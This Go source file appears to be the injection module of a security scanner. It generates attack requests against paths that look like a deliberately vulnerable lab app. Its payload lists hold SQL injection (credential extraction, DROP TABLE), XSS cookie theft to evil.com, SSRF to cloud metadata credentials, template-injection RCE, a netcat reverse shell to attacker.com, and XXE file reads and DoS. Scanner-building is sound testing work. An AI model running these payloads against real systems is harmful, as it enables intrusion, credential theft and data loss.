package attacks

import (
	"fmt"
	"net/url"

	"github.com/cornerglitch/internal/scanner"
)

// InjectionModule generates attack requests focused on injection vulnerabilities:
// SQL injection, XSS, SSRF, SSTI, command injection, LDAP injection, XML/XXE
// injection. Payloads are tested against common parameter names on common paths.
type InjectionModule struct{}

func (m *InjectionModule) Name() string     { return "injection" }
func (m *InjectionModule) Category() string { return "injection" }

func (m *InjectionModule) GenerateRequests(target string) []scanner.AttackRequest {
	var reqs []scanner.AttackRequest

	reqs = append(reqs, m.sqlInjection()...)
	reqs = append(reqs, m.xss()...)
	reqs = append(reqs, m.ssrf()...)
	reqs = append(reqs, m.ssti()...)
	reqs = append(reqs, m.commandInjection()...)
	reqs = append(reqs, m.ldapInjection()...)
	reqs = append(reqs, m.xmlInjection()...)

	return reqs
}

// ---------------------------------------------------------------------------
// SQL Injection
// ---------------------------------------------------------------------------

func (m *InjectionModule) sqlInjection() []scanner.AttackRequest {
	var reqs []scanner.AttackRequest

	payloads := []struct {
		value string
		sub   string
		desc  string
	}{
		// Classic
		{"' OR '1'='1", "union-based", "Classic OR true condition"},
		{"' OR '1'='1'--", "union-based", "OR true with comment terminator"},
		{"' OR ''='", "union-based", "OR empty-string equals empty-string"},
		{"admin'--", "auth-bypass", "Comment out password check"},
		{"' OR 1=1--", "auth-bypass", "Boolean true bypass"},
		// UNION SELECT
		{"' UNION SELECT NULL--", "union-based", "UNION SELECT with single NULL column"},
		{"' UNION SELECT NULL,NULL,NULL--", "union-based", "UNION SELECT with three NULL columns"},
		{"' UNION SELECT 1,username,password FROM users--", "union-based", "UNION SELECT credential extraction"},
		{"1 UNION SELECT ALL FROM information_schema.tables--", "union-based", "UNION SELECT schema enumeration"},
		// Error-based
		{"' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--", "error-based", "MSSQL error-based table extraction"},
		{"' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))--", "error-based", "MySQL EXTRACTVALUE error extraction"},
		{"' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT version()),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--", "error-based", "MySQL error-based double query"},
		// Time-based blind
		{"' AND SLEEP(5)--", "time-based-blind", "MySQL time-based blind with SLEEP"},
		{"' AND pg_sleep(5)--", "time-based-blind", "PostgreSQL time-based blind with pg_sleep"},
		{"'; WAITFOR DELAY '0:0:5'--", "time-based-blind", "MSSQL time-based blind with WAITFOR"},
		{"' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--", "time-based-blind", "MySQL nested SLEEP blind"},
		// Boolean-based blind
		{"' AND 1=1--", "boolean-blind", "Boolean blind: true condition"},
		{"' AND 1=2--", "boolean-blind", "Boolean blind: false condition"},
		{"' AND SUBSTRING(@@version,1,1)='5'--", "boolean-blind", "Boolean blind: version check"},
		// Stacked queries
		{"'; DROP TABLE users;--", "stacked-query", "Stacked query: drop table"},
		{"'; INSERT INTO users(username,password) VALUES('hacker','hacked');--", "stacked-query", "Stacked query: insert user"},
		// NoSQL
		{`{"$gt":""}`, "nosql", "MongoDB $gt operator injection"},
		{`{"$ne":null}`, "nosql", "MongoDB $ne null injection"},
		{`{"$regex":".*"}`, "nosql", "MongoDB regex match all"},
	}

	params := []string{"q", "search", "id", "name", "username", "email"}
	paths := []string{"/", "/search", "/api/v1/users", "/login", "/admin", "/vuln/a03/search"}

	for _, path := range paths {
		for _, param := range params {
			for _, p := range payloads {
				reqs = append(reqs, scanner.AttackRequest{
					Method:      "GET",
					Path:        fmt.Sprintf("%s?%s=%s", path, param, url.QueryEscape(p.value)),
					Headers:     map[string]string{},
					Category:    "SQL-Injection",
					SubCategory: p.sub,
					Description: fmt.Sprintf("SQLi [%s] on %s?%s: %s", p.sub, path, param, p.desc),
				})
			}
		}
	}

	// POST-based SQL injection on login forms
	loginPaths := []string{"/login", "/api/auth", "/vuln/a03/login", "/vuln/a07/login"}
	for _, path := range loginPaths {
		for _, p := range payloads[:6] { // Use first 6 (auth-bypass relevant) payloads
			reqs = append(reqs, scanner.AttackRequest{
				Method:      "POST",
				Path:        path,
				Headers:     map[string]string{},
				Body:        fmt.Sprintf("username=%s&password=anything", url.QueryEscape(p.value)),
				BodyType:    "application/x-www-form-urlencoded",
				Category:    "SQL-Injection",
				SubCategory: p.sub,
				Description: fmt.Sprintf("SQLi POST [%s] on %s: %s", p.sub, path, p.desc),
			})
		}
	}

	return reqs
}

// ---------------------------------------------------------------------------
// XSS (Cross-Site Scripting)
// ---------------------------------------------------------------------------

func (m *InjectionModule) xss() []scanner.AttackRequest {
	var reqs []scanner.AttackRequest

	payloads := []struct {
		value string
		sub   string
		desc  string
	}{
		// Reflected XSS
		{"<script>alert('XSS')</script>", "reflected", "Basic script tag"},
		{"<script>alert(String.fromCharCode(88,83,83))</script>", "reflected", "Char code obfuscation"},
		{"\"><script>alert(1)</script>", "reflected", "Attribute breakout with script"},
		{"'><script>alert(1)</script>", "reflected", "Single-quote attribute breakout"},
		{"<img src=x onerror=alert(1)>", "reflected", "Image onerror handler"},
		{"<svg onload=alert(1)>", "reflected", "SVG onload handler"},
		{"<body onload=alert(1)>", "reflected", "Body onload handler"},
		{"<iframe src=\"javascript:alert(1)\">", "reflected", "Iframe with javascript URI"},
		{"<details open ontoggle=alert(1)>", "reflected", "Details element ontoggle"},
		{"<marquee onstart=alert(1)>", "reflected", "Marquee onstart handler"},
		// DOM-based XSS
		{"#<img src=x onerror=alert(1)>", "dom-based", "Fragment-based DOM XSS"},
		{"javascript:alert(document.cookie)", "dom-based", "JavaScript URI scheme"},
		{"data:text/html,<script>alert(1)</script>", "dom-based", "Data URI scheme"},
		// Stored XSS payloads (sent via POST)
		{"<script>new Image().src='http://evil.com/?c='+document.cookie</script>", "stored", "Cookie stealing script"},
		{"<svg/onload=fetch('http://evil.com/?c='+document.cookie)>", "stored", "SVG fetch cookie exfil"},
		// Filter bypass
		{"<scr<script>ipt>alert(1)</scr</script>ipt>", "filter-bypass", "Nested script tag bypass"},
		{"<img src=x onerror=alert`1`>", "filter-bypass", "Template literal bypass"},
		{"<svg><animate onbegin=alert(1) attributeName=x>", "filter-bypass", "SVG animate element"},
		{"%3Cscript%3Ealert(1)%3C/script%3E", "filter-bypass", "URL-encoded script tag"},
		{"&#60;script&#62;alert(1)&#60;/script&#62;", "filter-bypass", "HTML entity encoded"},
	}

	params := []string{"q", "search", "name", "error", "message", "input", "redirect"}
	paths := []string{"/", "/search", "/vuln/a07/login", "/vuln/client-side/dom-xss"}

	for _, path := range paths {
		for _, param := range params {
			for _, p := range payloads {
				reqs = append(reqs, scanner.AttackRequest{
					Method:      "GET",
					Path:        fmt.Sprintf("%s?%s=%s", path, param, url.QueryEscape(p.value)),
					Headers:     map[string]string{},
					Category:    "XSS",
					SubCategory: p.sub,
					Description: fmt.Sprintf("XSS [%s] on %s?%s: %s", p.sub, path, param, p.desc),
				})
			}
		}
	}

	// POST-based stored XSS
	storePaths := []string{"/api/v1/users", "/vuln/a03/search"}
	for _, path := range storePaths {
		for _, p := range payloads[13:15] { // stored payloads
			reqs = append(reqs, scanner.AttackRequest{
				Method:      "POST",
				Path:        path,
				Headers:     map[string]string{},
				Body:        fmt.Sprintf("name=%s&comment=%s", url.QueryEscape(p.value), url.QueryEscape(p.value)),
				BodyType:    "application/x-www-form-urlencoded",
				Category:    "XSS",
				SubCategory: p.sub,
				Description: fmt.Sprintf("XSS POST [%s] on %s: %s", p.sub, path, p.desc),
			})
		}
	}

	return reqs
}

// ---------------------------------------------------------------------------
// SSRF (Server-Side Request Forgery)
// ---------------------------------------------------------------------------

func (m *InjectionModule) ssrf() []scanner.AttackRequest {
	var reqs []scanner.AttackRequest

	targets := []struct {
		value string
		desc  string
	}{
		// AWS metadata
		{"http://169.254.169.254/latest/meta-data/", "AWS EC2 instance metadata"},
		{"http://169.254.169.254/latest/meta-data/iam/security-credentials/", "AWS IAM credentials"},
		{"http://169.254.169.254/latest/user-data/", "AWS user data"},
		// GCP metadata
		{"http://metadata.google.internal/computeMetadata/v1/", "GCP metadata endpoint"},
		// Azure metadata
		{"http://169.254.169.254/metadata/instance?api-version=2021-02-01", "Azure instance metadata"},
		// Internal services
		{"http://localhost/", "Localhost probe"},
		{"http://localhost:8766/api/metrics", "Internal dashboard metrics"},
		{"http://127.0.0.1:22", "Internal SSH service probe"},
		{"http://127.0.0.1:6379", "Internal Redis service probe"},
		{"http://127.0.0.1:3306", "Internal MySQL service probe"},
		{"http://127.0.0.1:5432", "Internal PostgreSQL service probe"},
		{"http://127.0.0.1:9200", "Internal Elasticsearch probe"},
		{"http://[::1]/", "IPv6 localhost"},
		{"http://0.0.0.0/", "All-interfaces address"},
		{"http://0x7f000001/", "Hex-encoded localhost"},
		{"http://2130706433/", "Decimal-encoded localhost"},
		// DNS rebinding / bypass
		{"http://localtest.me/", "DNS rebinding via localtest.me"},
		{"http://spoofed.burpcollaborator.net/", "External collaborator"},
		// File protocol
		{"file:///etc/passwd", "File protocol read /etc/passwd"},
		{"file:///etc/shadow", "File protocol read /etc/shadow"},
		// Dict/gopher
		{"gopher://127.0.0.1:6379/_INFO", "Gopher protocol Redis INFO"},
		{"dict://127.0.0.1:6379/info", "Dict protocol Redis info"},
	}

	params := []string{"url", "file", "page", "redirect", "target", "path", "src"}
	paths := []string{"/", "/vuln/a10/fetch", "/vuln/a10/proxy", "/proxy", "/vuln/api-sec/api7/preview"}

	for _, path := range paths {
		for _, param := range params {
			for _, t := range targets {
				reqs = append(reqs, scanner.AttackRequest{
					Method:      "GET",
					Path:        fmt.Sprintf("%s?%s=%s", path, param, url.QueryEscape(t.value)),
					Headers:     map[string]string{},
					Category:    "SSRF",
					SubCategory: "server-side-request-forgery",
					Description: fmt.Sprintf("SSRF on %s?%s: %s", path, param, t.desc),
				})
			}
		}
	}

	return reqs
}

// ---------------------------------------------------------------------------
// SSTI (Server-Side Template Injection)
// ---------------------------------------------------------------------------

func (m *InjectionModule) ssti() []scanner.AttackRequest {
	var reqs []scanner.AttackRequest

	payloads := []struct {
		value  string
		engine string
		desc   string
	}{
		// Jinja2 / Twig
		{"{{7*7}}", "jinja2", "Basic math expression"},
		{"{{7*'7'}}", "jinja2", "String multiplication (Jinja2-specific)"},
		{"{{config.items()}}", "jinja2", "Flask config dump"},
		{"{{''.__class__.__mro__[2].__subclasses__()}}", "jinja2", "Python class traversal"},
		{"{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}", "jinja2", "RCE via Jinja2"},
		// Freemarker
		{"${7*7}", "freemarker", "Basic Freemarker expression"},
		{"<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}", "freemarker", "Freemarker RCE"},
		// ERB (Ruby)
		{"<%= 7*7 %>", "erb", "Basic ERB expression"},
		{"<%= system('id') %>", "erb", "ERB system command"},
		// Smarty
		{"{php}echo `id`;{/php}", "smarty", "Smarty PHP code execution"},
		// Mako
		{"${__import__('os').popen('id').read()}", "mako", "Mako Python import RCE"},
		// Pebble
		{"{% set cmd='id' %}{{runtime.exec(cmd)}}", "pebble", "Pebble runtime exec"},
		// Thymeleaf
		{"__${T(java.lang.Runtime).getRuntime().exec('id')}__", "thymeleaf", "Thymeleaf SpEL RCE"},
		// Generic
		{"#{7*7}", "generic", "Generic hash expression"},
		{"${{7*7}}", "generic", "Double-brace expression"},
		{"@(1+1)", "razor", "Razor syntax expression"},
	}

	params := []string{"template", "name", "page", "q"}
	paths := []string{"/vuln/ssti/render", "/search", "/"}

	for _, path := range paths {
		for _, param := range params {
			for _, p := range payloads {
				reqs = append(reqs, scanner.AttackRequest{
					Method:      "GET",
					Path:        fmt.Sprintf("%s?%s=%s", path, param, url.QueryEscape(p.value)),
					Headers:     map[string]string{},
					Category:    "SSTI",
					SubCategory: p.engine,
					Description: fmt.Sprintf("SSTI [%s] on %s?%s: %s", p.engine, path, param, p.desc),
				})
			}
		}
	}

	return reqs
}

// ---------------------------------------------------------------------------
// Command Injection
// ---------------------------------------------------------------------------

func (m *InjectionModule) commandInjection() []scanner.AttackRequest {
	var reqs []scanner.AttackRequest

	payloads := []struct {
		value string
		desc  string
	}{
		// Semicolon chaining
		{"; id", "Semicolon: execute id"},
		{"; cat /etc/passwd", "Semicolon: read /etc/passwd"},
		{"; whoami", "Semicolon: whoami"},
		{"; uname -a", "Semicolon: system info"},
		// Pipe chaining
		{"| id", "Pipe: execute id"},
		{"| cat /etc/passwd", "Pipe: read /etc/passwd"},
		{"| nc -e /bin/sh attacker.com 4444", "Pipe: reverse shell"},
		// Backtick substitution
		{"`id`", "Backtick: execute id"},
		{"`whoami`", "Backtick: whoami"},
		// $() substitution
		{"$(id)", "Dollar-paren: execute id"},
		{"$(cat /etc/passwd)", "Dollar-paren: read /etc/passwd"},
		{"$(sleep 5)", "Dollar-paren: time-based detection"},
		// AND chaining
		{"&& id", "AND chain: execute id"},
		{"&& cat /etc/passwd", "AND chain: read /etc/passwd"},
		// OR chaining
		{"|| id", "OR chain: execute id"},
		// Newline injection
		{"%0aid", "Newline: execute id"},
		{"\nid", "Literal newline: execute id"},
		// Windows-specific
		{"& dir", "Windows: directory listing"},
		{"| type C:\\Windows\\System32\\drivers\\etc\\hosts", "Windows: read hosts file"},
	}

	params := []string{"cmd", "command", "exec", "ping", "host", "ip", "file"}
	paths := []string{"/vuln/cmd/exec", "/", "/admin"}

	for _, path := range paths {
		for _, param := range params {
			for _, p := range payloads {
				reqs = append(reqs, scanner.AttackRequest{
					Method:      "GET",
					Path:        fmt.Sprintf("%s?%s=%s", path, param, url.QueryEscape(p.value)),
					Headers:     map[string]string{},
					Category:    "Command-Injection",
					SubCategory: "os-command-injection",
					Description: fmt.Sprintf("CmdI on %s?%s: %s", path, param, p.desc),
				})
			}
		}
	}

	return reqs
}

// ---------------------------------------------------------------------------
// LDAP Injection
// ---------------------------------------------------------------------------

func (m *InjectionModule) ldapInjection() []scanner.AttackRequest {
	var reqs []scanner.AttackRequest

	payloads := []struct {
		value string
		desc  string
	}{
		{"*", "Wildcard: match all entries"},
		{"*)(uid=*))(|(uid=*", "LDAP filter injection: always-true"},
		{"admin)(&)", "LDAP admin bypass"},
		{"*)(objectClass=*", "LDAP enumerate all object classes"},
		{")(cn=*)(|(cn=*", "LDAP CN enumeration"},
		{"admin)(|(password=*)", "LDAP password attribute extraction"},
		{")(&(|", "Malformed LDAP filter for error extraction"},
		{"*()|&'", "Special character injection for error"},
	}

	params := []string{"username", "name", "q", "search", "id"}
	paths := []string{"/login", "/search", "/api/v1/users", "/admin"}

	for _, path := range paths {
		for _, param := range params {
			for _, p := range payloads {
				reqs = append(reqs, scanner.AttackRequest{
					Method:      "GET",
					Path:        fmt.Sprintf("%s?%s=%s", path, param, url.QueryEscape(p.value)),
					Headers:     map[string]string{},
					Category:    "LDAP-Injection",
					SubCategory: "ldap-injection",
					Description: fmt.Sprintf("LDAP injection on %s?%s: %s", path, param, p.desc),
				})
			}
		}
	}

	return reqs
}

// ---------------------------------------------------------------------------
// XML Injection / XXE
// ---------------------------------------------------------------------------

func (m *InjectionModule) xmlInjection() []scanner.AttackRequest {
	var reqs []scanner.AttackRequest

	payloads := []struct {
		body string
		sub  string
		desc string
	}{
		// XXE: file read
		{`<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>`,
			"xxe-file-read", "XXE: read /etc/passwd"},
		{`<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/shadow">]><root>&xxe;</root>`,
			"xxe-file-read", "XXE: read /etc/shadow"},
		{`<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///proc/self/environ">]><root>&xxe;</root>`,
			"xxe-file-read", "XXE: read process environment"},
		// XXE: SSRF
		{`<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><root>&xxe;</root>`,
			"xxe-ssrf", "XXE: SSRF to AWS metadata"},
		{`<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://localhost:8766/">]><root>&xxe;</root>`,
			"xxe-ssrf", "XXE: SSRF to internal dashboard"},
		// XXE: parameter entity
		{`<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://evil.com/xxe.dtd">%xxe;]><root>test</root>`,
			"xxe-oob", "XXE: out-of-band via external DTD"},
		// XXE: billion laughs (DoS)
		{`<?xml version="1.0"?><!DOCTYPE lolz [<!ENTITY lol "lol"><!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;"><!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">]><root>&lol3;</root>`,
			"xxe-dos", "XXE: billion laughs (entity expansion DoS)"},
		// XInclude
		{`<root xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></root>`,
			"xinclude", "XInclude: read /etc/passwd"},
		// XSLT injection
		{`<?xml version="1.0"?><xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" version="1.0"><xsl:template match="/"><xsl:value-of select="system-property('xsl:vendor')"/></xsl:template></xsl:stylesheet>`,
			"xslt", "XSLT: vendor information disclosure"},
	}

	xmlPaths := []string{"/vuln/xxe/parse", "/api/v1/users", "/"}

	for _, path := range xmlPaths {
		for _, p := range payloads {
			reqs = append(reqs, scanner.AttackRequest{
				Method:      "POST",
				Path:        path,
				Headers:     map[string]string{},
				Body:        p.body,
				BodyType:    "application/xml",
				Category:    "XML-Injection",
				SubCategory: p.sub,
				Description: fmt.Sprintf("XML [%s] on %s: %s", p.sub, path, p.desc),
			})
		}
	}

	return reqs
}
